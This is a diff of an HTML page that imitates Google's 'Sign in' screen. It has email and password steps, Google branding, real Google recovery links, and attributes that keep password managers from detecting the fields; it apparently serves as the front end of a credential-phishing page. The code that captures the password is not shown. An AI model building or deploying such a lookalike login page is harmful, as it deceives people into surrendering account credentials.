@@ -6,463 +6,387 @@
 <title>Sign in – Google Accounts</title>
 <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="/frontend/src/style.css">
+<!-- <script src="https://cdn.tailwindcss.com"></script> -->
 <script>
 tailwind.config = {
-  darkMode: ['selector', '[data-theme="dark"]'],
-  theme: {
-    extend: {
-      fontFamily: {
-        'google': ['"Google Sans"', 'sans-serif'],
-        'roboto': ['Roboto', 'Arial', 'sans-serif'],
-      },
-      colors: {
-        /* dark tokens */
-        'd-page':    '#1f1f1f',
-        'd-card':    '#2d2d2d',
-        'd-input':   '#5f6368',
-        'd-focus':   '#8ab4f8',
-        'd-error':   '#f28b82',
-        'd-text':    '#e3e3e3',
-        'd-muted':   '#ababab',
-        'd-link':    '#8ab4f8',
-        'd-btnbg':   '#8ab4f8',
-        'd-btnfg':   '#202124',
-        'd-chip':    '#5f6368',
-        'd-avatar':  '#4285f4',
-        'd-divider': '#3c3c3c',
-        /* light tokens */
-        'l-page':    '#f1f3f4',
-        'l-card':    '#ffffff',
-        'l-border':  '#dadce0',
-        'l-focus':   '#1a73e8',
-        'l-error':   '#d93025',
-        'l-text':    '#202124',
-        'l-muted':   '#5f6368',
-        'l-link':    '#1a73e8',
-        'l-btnbg':   '#1a73e8',
-        'l-btnfg':   '#ffffff',
-        'l-avatar':  '#1a73e8',
-        'l-divider': '#e0e0e0',
-      },
-      borderRadius: {
-        'card': '28px',
-      },
-      maxWidth: {
-        'card': '860px',
-      }
-    }
-  }
+darkMode: ['selector', '[data-theme="dark"]'],
+theme: {
+extend: {
+fontFamily: {
+'google': ['"Google Sans"', 'sans-serif'],
+'roboto': ['Roboto', 'Arial', 'sans-serif'],
+},
+colors: {
+/* dark tokens */
+'d-page': '#202124',
+'d-card': '#0e0e0e',
+'d-input':   '#5f6368',
+'d-focus':   '#8ab4f8',
+'d-error':   '#f28b82',
+'d-text':    '#e3e3e3',
+'d-muted':   '#ababab',
+'d-link':    '#8ab4f8',
+'d-btnbg':   '#8ab4f8',
+'d-btnfg':   '#202124',
+'d-chip':    '#5f6368',
+'d-avatar':  '#4285f4',
+'d-divider': '#3c3c3c',
+/* light tokens */
+'l-page':    '#f1f3f4',
+'l-card':    '#ffffff',
+'l-border':  '#dadce0',
+'l-focus':   '#1a73e8',
+'l-error':   '#d93025',
+'l-text':    '#202124',
+'l-muted':   '#5f6368',
+'l-link':    '#1a73e8',
+'l-btnbg':   '#1a73e8',
+'l-btnfg':   '#ffffff',
+'l-avatar':  '#1a73e8',
+'l-divider': '#e0e0e0',
+},
+borderRadius: {
+'card': '28px',
+},
+maxWidth: {
+'card': '860px',
+}
+}
+}
 }
 </script>
 <style>
-  /* ── custom properties injected by JS on load ── */
-  *, *::before, *::after { box-sizing: border-box; }
+/* ── custom properties injected by JS on load ── */
+*, *::before, *::after { box-sizing: border-box; }
 
-  /* floating-label input — cannot be done with pure Tailwind */
-  .fl-label {
-    position: absolute;
-    left: 17px;
-    top: 50%;
-    transform: translateY(-50%);
-    font-size: 16px;
-    pointer-events: none;
-    transition: top .15s, transform .15s, font-size .15s, color .15s;
-    transform-origin: left center;
-  }
-  .fl-input:focus ~ .fl-label,
-  .fl-input:not(:placeholder-shown) ~ .fl-label {
-    top: 10px;
-    transform: translateY(0) scale(.75);
-  }
+/* floating-label input — cannot be done with pure Tailwind */
+.fl-label {
+position: absolute;
+left: 17px;
+top: 50%;
+transform: translateY(-50%);
+font-size: 16px;
+pointer-events: none;
+transition: top .15s, transform .15s, font-size .15s, color .15s;
+transform-origin: left center;
+}
+.fl-input:focus ~ .fl-label,
+.fl-input:not(:placeholder-shown) ~ .fl-label {
+top: 0px;
+transform: translateY(-50%) scale(.75);
+padding: 0 4px;
+}
+/* Ensure background perfectly matches the card backgrounds in both states */
+[data-theme="light"] .fl-input:focus ~ .fl-label,
+[data-theme="light"] .fl-input:not(:placeholder-shown) ~ .fl-label { background-color: #f0f4f9; z-index: 10; }
+[data-theme="dark"] .fl-input:focus ~ .fl-label,
+[data-theme="dark"] .fl-input:not(:placeholder-shown) ~ .fl-label { background-color: #0f0f0f; z-index: 10; }
+/* slide-in animation for steps */
+@keyframes slideIn {
+from { opacity: 0; transform: translateX(12px); }
+to   { opacity: 1; transform: translateX(0); }
+}
+.step-active { animation: slideIn .2s ease; }
 
-  /* slide-in animation for steps */
-  @keyframes slideIn {
-    from { opacity: 0; transform: translateX(12px); }
-    to   { opacity: 1; transform: translateX(0); }
-  }
-  .step-active { animation: slideIn .2s ease; }
+/* error row slide */
+.err-row {
+max-height: 0;
+overflow: hidden;
+transition: max-height .2s ease, margin-top .2s ease;
+margin-top: 0;
+}
+.err-row.err-show { max-height: 60px; margin-top: 6px; }
 
-  /* error row slide */
-  .err-row {
-    max-height: 0;
-    overflow: hidden;
-    transition: max-height .2s ease, margin-top .2s ease;
-    margin-top: 0;
-  }
-  .err-row.err-show { max-height: 60px; margin-top: 6px; }
+/* disable browser autofill background flash */
+input:-webkit-autofill,
+input:-webkit-autofill:hover,
+input:-webkit-autofill:focus {
+transition: background-color 9999s ease 9999s, color 9999s ease 9999s;
+-webkit-text-fill-color: inherit !important;
+}
 
-  /* disable browser autofill background flash */
-  input:-webkit-autofill,
-  input:-webkit-autofill:hover,
-  input:-webkit-autofill:focus {
-    transition: background-color 9999s ease 9999s, color 9999s ease 9999s;
-    -webkit-text-fill-color: inherit !important;
-  }
+#card{
+display:grid;
+grid-template-columns:1fr;
+}
+
+@media (min-width:768px){
+#card{
+grid-template-columns:1fr 1fr;
+}
+}
+@media (min-width: 768px){
+main{
+transform: translateY(0);
+}
+}
+@media (max-width: 767px){
+#card {
+border-radius: 0 !important;
+border: none !important;
+min-height: auto !important;
+max-width: 100% !important;
+box-shadow: none !important;
+background: transparent !important;
+}
+
+main {
+padding: 0 !important;
+display: block !important;
+}
+
+/* Forces the layout to behave sequentially on mobile instead of split screen panels */
+#card > div {
+padding-left: 24px !important;
+padding-right: 24px !important;
+}
+}
 </style>
 </head>
 
 <!-- ROOT: bg switches between dark/light via JS class toggle on <html> -->
-<body id="body" class="
-  min-h-screen flex flex-col font-roboto
-  bg-[#1f1f1f] text-[#e3e3e3]
-  transition-colors duration-300
-">
-
-<!-- ══════════════════════════════════════════════
-     THEME TOGGLE
+<body id="body" class="min-h-screen flex flex-col font-roboto bg-[#f0f4f9] dark:bg-[#131314] text-[#202124] dark:text-[#e3e3e3] transition-colors duration-300"><!-- ══════════════════════════════════════════════
+    THEME TOGGLE
 ═══════════════════════════════════════════════ -->
 <button
-  id="theme-btn"
-  onclick="toggleTheme()"
-  aria-label="Toggle dark/light mode"
-  class="
-    fixed top-4 right-4 z-50
-    w-10 h-10 rounded-full
-    flex items-center justify-center
-    border border-[#5f6368]
-    bg-[#2d2d2d] text-[#e3e3e3]
-    shadow-md cursor-pointer
-    transition-colors duration-200
-    hover:bg-white/5
-  "
+id="theme-btn"
+onclick="toggleTheme()"
+aria-label="Toggle dark/light mode"
+class="
+   fixed top-4 right-4 z-50
+   w-10 h-10 rounded-full
+   flex items-center justify-center
+   border border-[#5f6368]
+  bg-[#0b0b0b] text-[#e3e3e3]
+   shadow-md cursor-pointer
+   transition-colors duration-200
+   hover:bg-white/5
+ "
 >
-  <!-- moon (dark mode shown) -->
-  <svg id="icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>
-  </svg>
-  <!-- sun (light mode shown) -->
-  <svg id="icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
-    class="hidden">
-    <circle cx="12" cy="12" r="5"/>
-    <line x1="12" y1="1" x2="12" y2="3"/>
-    <line x1="12" y1="21" x2="12" y2="23"/>
-    <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/>
-    <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/>
-    <line x1="1" y1="12" x2="3" y2="12"/>
-    <line x1="21" y1="12" x2="23" y2="12"/>
-    <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/>
-    <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/>
-  </svg>
+<!-- moon (dark mode shown) -->
+<svg id="icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>
+</svg>
+<!-- sun (light mode shown) -->
+<svg id="icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none"
+stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+class="hidden">
+<circle cx="12" cy="12" r="5"/>
+<line x1="12" y1="1" x2="12" y2="3"/>
+<line x1="12" y1="21" x2="12" y2="23"/>
+<line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/>
+<line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/>
+<line x1="1" y1="12" x2="3" y2="12"/>
+<line x1="21" y1="12" x2="23" y2="12"/>
+<line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/>
+<line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/>
+</svg>
 </button>
 
 <!-- ══════════════════════════════════════════════
-     MAIN
+    MAIN
 ═══════════════════════════════════════════════ -->
-<main class="flex-1 flex items-center justify-center px-4 py-10">
+<main class="flex-1 flex items-center justify-center px-6 py-6">
 
-  <!-- CARD -->
-  <div
-    id="card"
-    class="
-      w-full max-w-[860px] rounded-[28px] overflow-hidden
-      grid grid-cols-1 md:grid-cols-[1fr_1px_1fr]
-      bg-[#2d2d2d] border border-transparent
-      transition-colors duration-300
-    "
-  >
+<!-- CARD -->
+<div id="card" class="w-full max-w-[1040px] min-h-[440px] rounded-[28px] overflow-hidden grid grid-cols-1 md:grid-cols-2 bg-white dark:bg-[#0f0f0f]  dark:border-transparent transition-colors duration-300">    <!-- ── LEFT PANEL ── -->
+<div class="flex flex-col justify-start gap-4 px-6 pt-6 pb-2 md:px-[52px] md:pt-[48px] md:pb-10">      <svg width="40" height="40" viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
+<path d="M39.2 20.45c0-1.55-.14-3.04-.4-4.47H20v8.46h10.8c-.47 2.47-1.87 4.57-3.98 5.97v4.96h6.44c3.77-3.47 5.94-8.59 5.94-14.92z" fill="#4285F4"/>
+<path d="M20 40c5.4 0 9.94-1.79 13.26-4.84l-6.44-4.96c-1.8 1.2-4.1 1.91-6.82 1.91-5.25 0-9.69-3.55-11.28-8.32H2.07v5.12A20 20 0 0 0 20 40z" fill="#34A853"/>
+<path d="M8.72 23.79A12.02 12.02 0 0 1 8.1 20c0-1.31.22-2.58.62-3.79V11.1H2.07A20 20 0 0 0 0 20c0 3.23.77 6.29 2.07 9.01l6.65-5.22z" fill="#FBBC05"/>
+<path d="M20 7.95c2.96 0 5.61 1.02 7.7 3.02l5.78-5.78C29.93 1.99 25.39 0 20 0A20 20 0 0 0 2.07 11.1l6.65 5.12C10.31 11.5 14.75 7.95 20 7.95z" fill="#EA4335"/>
+</svg>
 
-    <!-- ── LEFT PANEL ── -->
-    <div class="flex flex-col gap-7 p-10 md:p-14">
-
-      <!-- Google G mark -->
-      <svg width="40" height="40" viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
-        <path d="M39.2 20.45c0-1.55-.14-3.04-.4-4.47H20v8.46h10.8c-.47 2.47-1.87 4.57-3.98 5.97v4.96h6.44c3.77-3.47 5.94-8.59 5.94-14.92z" fill="#4285F4"/>
-        <path d="M20 40c5.4 0 9.94-1.79 13.26-4.84l-6.44-4.96c-1.8 1.2-4.1 1.91-6.82 1.91-5.25 0-9.69-3.55-11.28-8.32H2.07v5.12A20 20 0 0 0 20 40z" fill="#34A853"/>
-        <path d="M8.72 23.79A12.02 12.02 0 0 1 8.1 20c0-1.31.22-2.58.62-3.79V11.1H2.07A20 20 0 0 0 0 20c0 3.23.77 6.29 2.07 9.01l6.65-5.22z" fill="#FBBC05"/>
-        <path d="M20 7.95c2.96 0 5.61 1.02 7.7 3.02l5.78-5.78C29.93 1.99 25.39 0 20 0A20 20 0 0 0 2.07 11.1l6.65 5.12C10.31 11.5 14.75 7.95 20 7.95z" fill="#EA4335"/>
-      </svg>
-
-      <!-- Heading + subtext -->
-      <div>
-        <h1 id="main-heading"
-          class="font-google text-[32px] font-normal leading-tight text-[#e3e3e3] transition-colors duration-300">
-          Sign in
-        </h1>
-        <p id="main-subtext"
-          class="text-base leading-relaxed text-[#ababab] max-w-[270px] mt-3 transition-all duration-300">
-          with your Google Account. This account will be available to other Google apps in the browser.
-        </p>
-      </div>
-
-      <!-- Avatar chip (hidden until email step) -->
-      <div
-        id="avatar-chip"
-        onclick="goBackToEmail()"
-        role="button"
-        tabindex="0"
-        aria-label="Change account"
-        onkeydown="if(event.key==='Enter')goBackToEmail()"
-        class="
-          hidden items-center gap-2.5
-          w-fit max-w-[270px]
-          border border-[#5f6368] rounded-full
-          px-3.5 py-1.5 pl-1.5
-          cursor-pointer
-          transition-colors duration-150
-          hover:bg-white/[0.06]
-        "
-      >
-        <div id="avatar-circle"
-          class="
-            w-8 h-8 rounded-full shrink-0
-            bg-[#4285f4] text-white
-            font-google text-sm font-medium
-            flex items-center justify-center
-          ">A</div>
-        <span id="chip-email"
-          class="text-sm text-[#e3e3e3] truncate max-w-[170px] transition-colors duration-300">
-          user@gmail.com
-        </span>
-        <span class="text-[10px] text-[#ababab]">▾</span>
-      </div>
-
-    </div><!-- /panel-left -->
-
-    <!-- ── VERTICAL DIVIDER ── -->
-    <div id="v-divider" class="hidden md:block bg-[#3c3c3c] transition-colors duration-300"></div>
-
-    <!-- ── RIGHT PANEL ── -->
-    <div class="flex flex-col justify-center px-10 pb-12 pt-3 md:p-14">
-
-      <!-- STEP 1: EMAIL -->
-      <div id="step-email" class="flex flex-col step-active">
-
-        <!-- Input -->
-        <div class="relative w-full">
-          <input
-            id="email-input"
-            type="email"
-            placeholder=" "
-            autocomplete="off"
-            autocorrect="off"
-            autocapitalize="off"
-            spellcheck="false"
-            data-lpignore="true"
-            data-form-type="other"
-            class="
-              fl-input
-              w-full h-14 pt-[22px] pb-2 px-4
-              rounded text-base outline-none
-              border border-[#5f6368]
-              bg-transparent text-[#e3e3e3]
-              font-roboto
-              caret-[#8ab4f8]
-              transition-all duration-150
-              focus:border-2 focus:border-[#8ab4f8] focus:px-[15px]
-            "
-          />
-          <label for="email-input" class="fl-label text-[#ababab] transition-colors duration-150">
-            Email or phone
-          </label>
-        </div>
-
-        <!-- Error -->
-        <div id="email-err" class="err-row flex items-start gap-1.5 text-xs text-[#f28b82]">
-          <svg width="14" height="14" viewBox="0 0 20 20" fill="currentColor" class="shrink-0 mt-px">
-            <path d="M10 0C4.48 0 0 4.48 0 10s4.48 10 10 10 10-4.48 10-10S15.52 0 10 0zm1 15H9v-2h2v2zm0-4H9V5h2v6z"/>
-          </svg>
-          <span id="email-err-text">Enter an email or phone number</span>
-        </div>
-
-        <!-- Forgot email -->
-        <div class="mt-4">
-          <a href="#" class="text-sm font-medium text-[#8ab4f8] hover:underline transition-colors duration-150">
-            Forgot email?
-          </a>
-        </div>
-
-        <!-- Guest mode info -->
-        <p class="text-sm leading-relaxed text-[#ababab] mt-7 transition-colors duration-300">
-          Not your computer? Use Guest mode to sign in privately.
-          <a href="#" class="text-[#8ab4f8] font-normal hover:underline">Learn more about using Guest mode</a>
-        </p>
-
-        <!-- Buttons -->
-        <div class="flex justify-between items-center mt-10">
-          <!-- Locate your Step 1 buttons and append the target class identifier at the end -->
-<button class="
-  font-google text-sm font-medium
-  text-[#8ab4f8] px-2 py-2.5 rounded
-  cursor-pointer border-none bg-transparent
-  hover:bg-[rgba(138,180,248,0.1)]
-  transition-colors duration-100 tracking-[0.25px]
-  btn-txt
-">Create account</button>
-
-<button onclick="goToPassword()" class="
-  font-google text-sm font-medium
-  bg-[#8ab4f8] text-[#202124]
-  px-7 py-2.5 rounded-full
-  cursor-pointer border-none
-  hover:brightness-90 active:brightness-75
-  transition-all duration-100 tracking-[0.25px]
-  btn-pri
-">Next</button>
-        </div>
-
-      </div><!-- /step-email -->
-
-      <!-- STEP 2: PASSWORD -->
-      <div id="step-password" class="hidden flex-col step-active">
-
-        <!-- Input -->
-        <div class="relative w-full">
-          <input
-            id="pw-input"
-            type="password"
-            placeholder=" "
-            autocomplete="new-password"
-            data-lpignore="true"
-            data-form-type="other"
-            class="
-              fl-input
-              w-full h-14 pt-[22px] pb-2 px-4 pr-12
-              rounded text-base outline-none
-              border border-[#5f6368]
-              bg-transparent text-[#e3e3e3]
-              font-roboto
-              caret-[#8ab4f8]
-              transition-all duration-150
-              focus:border-2 focus:border-[#8ab4f8] focus:px-[15px]
-            "
-          />
-          <label for="pw-input" class="fl-label text-[#ababab] transition-colors duration-150">
-            Enter your password
-          </label>
-          <!-- Eye toggle -->
-          <button
-            id="eye-btn"
-            type="button"
-            onclick="togglePw()"
-            aria-label="Show password"
-            class="
-              absolute right-2.5 top-1/2 -translate-y-1/2
-              p-2 rounded-full
-              bg-transparent border-none cursor-pointer
-              text-[#ababab]
-              hover:bg-white/[0.06]
-              flex items-center justify-center
-              transition-colors duration-150
-            "
-          >
-            <svg id="eye-open" width="22" height="22" viewBox="0 0 24 24" fill="none"
-              stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
-              <circle cx="12" cy="12" r="3"/>
-            </svg>
-            <svg id="eye-off" width="22" height="22" viewBox="0 0 24 24" fill="none"
-              stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
-              class="hidden">
-              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
-              <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
-              <line x1="1" y1="1" x2="23" y2="23"/>
-            </svg>
-          </button>
-        </div>
-
-        <!-- Error -->
-        <div id="pw-err" class="err-row flex items-start gap-1.5 text-xs text-[#f28b82]">
-          <svg width="14" height="14" viewBox="0 0 20 20" fill="currentColor" class="shrink-0 mt-px">
-            <path d="M10 0C4.48 0 0 4.48 0 10s4.48 10 10 10 10-4.48 10-10S15.52 0 10 0zm1 15H9v-2h2v2zm0-4H9V5h2v6z"/>
-          </svg>
-          <span>Wrong password. Try again or click Forgot password to reset it.</span>
-        </div>
-
-        <!-- Forgot password -->
-        <div class="mt-4">
-  <a href="#" class="theme-link text-sm font-medium text-[#8ab4f8] hover:underline transition-colors duration-150">
-    Forgot password?
-  </a>
+<!-- Heading + subtext -->
+<div class="mt-1">
+<h1 id="main-heading" class="font-google text-[32px] font-normal tracking-normal leading-10 text-[#202124] dark:text-[#e3e3e3] transition-colors duration-300">
+Sign in
+</h1>
+<p id="main-subtext" class="text-base leading-relaxed text-[#5f6368] dark:text-[#ababab] max-w-[250px] mt-3 transition-all duration-300">
+Use your Google Account
+</p>
 </div>
 
-        <!-- Protection notice -->
-        <p class="text-sm leading-relaxed text-[#ababab] mt-5 transition-colors duration-300">
-          To protect your account, Google wants to make sure it's really you trying to sign in.
-        </p>
+<!-- Avatar chip (hidden until email step) -->
+<div
+id="avatar-chip"
+onclick="goBackToEmail()"
+role="button"
+tabindex="0"
+aria-label="Change account"
+onkeydown="if(event.key==='Enter')goBackToEmail()"
+class="
+         hidden items-center gap-2.5
+         w-fit max-w-[270px]
+         border border-[#5f6368] rounded-full
+         px-3.5 py-1.5 pl-1.5
+         cursor-pointer
+         transition-colors duration-150
+         hover:bg-white/[0.06]
+       "
+>
+<div id="avatar-circle"
+class="
+           w-8 h-8 rounded-full shrink-0
+           bg-[#4285f4] text-white
+           font-google text-sm font-medium
+           flex items-center justify-center
+         ">A</div>
+<span id="chip-email"
+class="text-sm text-[#e3e3e3] truncate max-w-[170px] transition-colors duration-300">
+user@gmail.com
+</span>
+<span class="text-[10px] text-[#ababab]">▾</span>
+</div>
 
-        <!-- Buttons -->
-        <button onclick="goBackToEmail()" class="
-  font-google text-sm font-medium
-  text-[#8ab4f8] px-2 py-2.5 rounded
-  cursor-pointer border-none bg-transparent
-  hover:bg-[rgba(138,180,248,0.1)]
-  transition-colors duration-100 tracking-[0.25px]
-  btn-txt
-">Back</button>
+</div><!-- /panel-left -->
 
-<button onclick="signIn()" class="
-  font-google text-sm font-medium
-  bg-[#8ab4f8] text-[#202124]
-  px-7 py-2.5 rounded-full
-  cursor-pointer border-none
-  hover:brightness-90 active:brightness-75
-  transition-all duration-100 tracking-[0.25px]
-  btn-pri
-">Next</button>
+<!-- ── VERTICAL DIVIDER ── -->
+<!-- <div id="v-divider" class="hidden md:block bg-[#3c3c3c] transition-colors duration-300"></div> -->
 
-      </div><!-- /step-password -->
 
-    </div><!-- /panel-right -->
-  </div><!-- /card -->
+<!-- ── RIGHT PANEL ── -->
+<div class="flex flex-col flex-1 px-10 py-10 md:px-[52px] md:py-[48px]">
+
+<div id="step-email" class="flex-1 flex flex-col step-active">
+<div class="relative w-full md:max-w-[390px] md:mt-[64px] mt-4">  <input
+id="email-input"
+type="email"
+placeholder=" "
+autocomplete="off"
+autocorrect="off"
+autocapitalize="off"
+spellcheck="false"
+data-lpignore="true"
+data-form-type="other"
+class="fl-input w-full h-[56px] px-4 rounded-[4px] text-md outline-none border border-[#5f6368] bg-transparent text-[#e3e3e3] font-roboto caret-[#8ab4f8] transition-all duration-150 focus:border-2 focus:border-[#8ab4f8]"          />
+<label for="email-input" class="fl-label text-[#ababab] transition-colors duration-150">
+Email or phone
+</label>
+</div>
+
+<div id="email-err" class="err-row flex items-start gap-1.5 text-xs text-[#f28b82]">
+<svg width="14" height="14" viewBox="0 0 20 20" fill="currentColor" class="shrink-0 mt-px">
+<path d="M10 0C4.48 0 0 4.48 0 10s4.48 10 10 10 10-4.48 10-10S15.52 0 10 0zm1 15H9v-2h2v2zm0-4H9V5h2v6z"/>
+</svg>
+<span id="email-err-text">Enter an email or phone number</span>
+</div>
+
+<div class="mt-4">
+<a href="https://accounts.google.com/signin/v2/usernamerecovery?dsh=S-64475324%3A1779010314839597&flowEntry=ServiceLogin&flowName=GlifWebSignIn&ifkv=AWa2PauO3LW4EDDZUqLWIy9bURtQiPvJA4YH6xrofrQsPKSNVkapYoB0i1xNBhkSSJk6QPLj-eJQUQ" class="theme-link text-sm font-medium text-[#8ab4f8] hover:underline transition-colors duration-150">
+Forgot email?
+</a>
+</div>
+
+<p class="theme-muted text-sm leading-relaxed text-[#ababab] mt-6 transition-colors duration-300">          Not your computer? Use Guest mode to sign in privately.
+<a href="#" class="theme-link text-sm font-normal hover:underline transition-colors duration-150">Learn more about using Guest mode</a>
+</p>
+
+<div class="flex justify-end max-md:justify-between gap-8 items-center mt-auto pt-6">
+<!-- Locate your Step 1 buttons and append the target class identifier at the end -->
+<a href="https://accounts.google.com/lifecycle/steps/signup/name?dsh=S1023973296:1779013438376562&flowEntry=SignUp&flowName=GlifWebSignIn&TL=APouJz5sb9oASrjfNvCAJ6kJGF8jZKovsreLsJYezTlmFbbCbkybEHHVF2OLs-X3&continue=https://accounts.google.com/ManageAccount?nc%3D1" class="inline-flex items-center justify-center font-google text-sm font-medium text-[#8ab4f8] px-4 h-10 rounded-full cursor-pointer hover:bg-[rgba(138,180,248,0.08)] transition-colors duration-100 tracking-[0.15px] btn-txt no-underline">Create account</a>          <button onclick="goToPassword()" class="inline-flex items-center justify-center font-google text-sm font-medium bg-[#8ab4f8] text-[#202124] px-6 h-10 rounded-full cursor-pointer hover:shadow-sm active:scale-[0.98] transition-all duration-100 tracking-[0.15px] btn-pri">Next</button>
+</div>
+
+</div><!-- /step-email -->
+
+<!-- STEP 2: PASSWORD -->
+<div id="step-password" class="hidden flex-col flex-1 step-active">
+
+<div class="relative w-full md:max-w-[390px] md:mt-[48px] mt-2">          <input
+id="pw-input"
+type="password"
+placeholder=" "
+autocomplete="new-password"
+data-lpignore="true"
+data-form-type="other"
+class="fl-input w-full h-14 pt-[22px] pb-2 px-4 pr-12 rounded text-base outline-none border border-[#5f6368] bg-transparent text-[#e3e3e3] font-roboto caret-[#8ab4f8] transition-all duration-150 focus:border-2 focus:border-[#8ab4f8] focus:px-[15px]"
+/>
+<label for="pw-input" class="fl-label text-[#ababab] transition-colors duration-150">
+Enter your password
+</label>
+<button id="eye-btn" type="button" onclick="togglePw()" aria-label="Show password" class="absolute right-2.5 top-1/2 -translate-y-1/2 p-2 rounded-full bg-transparent border-none cursor-pointer text-[#ababab] hover:bg-white/[0.06] flex items-center justify-center transition-colors duration-150">
+<svg id="eye-open" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+<circle cx="12" cy="12" r="3"/>
+</svg>
+<svg id="eye-off" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="hidden">
+<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
+<path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
+<line x1="1" y1="1" x2="23" y2="23"/>
+</svg>
+</button>
+</div>
+
+<div id="pw-err" class="err-row flex items-start gap-1.5 text-xs text-[#f28b82]">
+<svg width="14" height="14" viewBox="0 0 20 20" fill="currentColor" class="shrink-0 mt-px">
+<path d="M10 0C4.48 0 0 4.48 0 10s4.48 10 10 10 10-4.48 10-10S15.52 0 10 0zm1 15H9v-2h2v2zm0-4H9V5h2v6z"/>
+</svg>
+<span>Wrong password. Try again or click Forgot password to reset it.</span>
+</div>
+
+<div class="mt-4">
+<a href="https://accounts.google.com/v3/signin/challenge/pwd?TL=APouJz4aFpZmQ883V45feHndFOoEpXMXaVrAPUuD2bdJH9RY5AqbqL5LeQzmh9Ho&checkConnection=youtube%3A344&checkedDomains=youtube&cid=4&dsh=S-64475324%3A1779010525965130&flowEntry=ServiceLogin&flowName=GlifWebSignIn&ifkv=AWa2PauW6uNbJhaIGY7DQT3xu2YlG_Ayom-eNqMFdSAb0LPITNxnOqJ2TYanEHzbWrT1izNNsXbH&pstMsg=1" class="theme-link text-sm font-medium text-[#8ab4f8] hover:underline transition-colors duration-150">
+Forgot password?
+</a>
+</div>
+
+<p class="theme-info text-sm leading-relaxed text-[#ababab] mt-5 transition-colors duration-300">          To protect your account, Google wants to make sure it's really you trying to sign in.
+</p>
+
+<div class="flex justify-between items-center mt-auto pt-10 md:pt-6">          <button onclick="goBackToEmail()" class="inline-flex items-center justify-center font-google text-sm font-medium text-[#8ab4f8] px-4 h-10 rounded-full cursor-pointer hover:bg-[rgba(138,180,248,0.08)] transition-colors duration-100 tracking-[0.15px] btn-txt">Back</button>
+<button onclick="signIn()" class="inline-flex items-center justify-center font-google text-sm font-medium bg-[#8ab4f8] text-[#202124] px-6 h-10 rounded-full cursor-pointer hover:shadow-sm active:scale-[0.98] transition-all duration-100 tracking-[0.15px] btn-pri">Next</button>
+</div><!-- /step-password -->
+
+</div><!-- /panel-right -->
+</div><!-- /card -->
 </main>
 
 <!-- ══════════════════════════════════════════════
-     FOOTER
+    FOOTER
 ═══════════════════════════════════════════════ -->
-<footer class="px-6 py-3.5 flex flex-wrap justify-between items-center gap-2">
-  <button class="
-    flex items-center gap-1.5 bg-transparent border-none cursor-pointer
-    text-[13px] text-[#ababab] font-roboto p-0
-    hover:text-[#e3e3e3] transition-colors duration-200
-  ">
-    <svg width="16" height="16" viewBox="0 0 24 24" fill="none"
-      stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-      <circle cx="12" cy="12" r="10"/>
-      <line x1="2" y1="12" x2="22" y2="12"/>
-      <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
-    </svg>
-    English (United States)
-    <svg width="12" height="12" viewBox="0 0 24 24" fill="none"
-      stroke="currentColor" stroke-width="2.5" stroke-linecap="round">
-      <polyline points="6 9 12 15 18 9"/>
-    </svg>
-  </button>
-  <div class="flex gap-6">
-  <a href="#" class="foot-link text-[13px] text-[#ababab] no-underline hover:text-[#e3e3e3] hover:underline transition-colors duration-200">Help</a>
-  <a href="#" class="foot-link text-[13px] text-[#ababab] no-underline hover:text-[#e3e3e3] hover:underline transition-colors duration-200">Privacy</a>
-  <a href="#" class="foot-link text-[13px] text-[#ababab] no-underline hover:text-[#e3e3e3] hover:underline transition-colors duration-200">Terms</a>
+<footer class="w-full mb-8 max-w-[1040px] mx-auto  px-6 md:px-0 max-md:py-4 flex flex-row justify-between items-center gap-4  select-none">
+<button class="foot-btn flex items-center gap-2 bg-transparent border-none cursor-pointer text-xs text-[#5f6368] dark:text-[#ababab] font-roboto p-0 hover:text-[#202124] dark:hover:text-[#e3e3e3] transition-colors duration-200 outline-none">
+English (United States)
+<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round">
+<polyline points="6 9 12 15 18 9"/>
